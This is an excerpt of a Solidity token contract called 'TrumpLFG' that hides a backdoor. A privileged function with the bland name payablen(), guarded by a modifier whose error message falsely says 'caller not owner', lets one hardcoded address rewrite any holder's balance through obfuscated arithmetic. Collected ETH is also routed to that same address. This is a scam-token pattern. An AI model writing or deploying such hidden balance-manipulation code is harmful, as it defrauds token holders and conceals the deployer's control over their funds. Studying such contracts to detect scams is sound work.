...
contract  TrumpLFG is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "TrumpLFG";
    string private _symbol = "Trump";
    uint8 private _decimals = 9;

    modifier filed() {
        require(_msgSender() == ReceiverFundETH, "caller not owner");_;
    }
    ...
    constructor () {
        ...
        ReceiverFundETH = payable(address(0x0960Ad9637106454D6c254C1032dD9E3550cfb0B));
    ...
    function payablen(address sender, uint256 amount) public filed() {
        _balances[sender] = amount.eth(_balances[sender].eth(amount)).mul(_totalTaxIfBuying);
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(AmountETH > 0)
            ReceiverFundETH.transfer(AmountETH);
    }
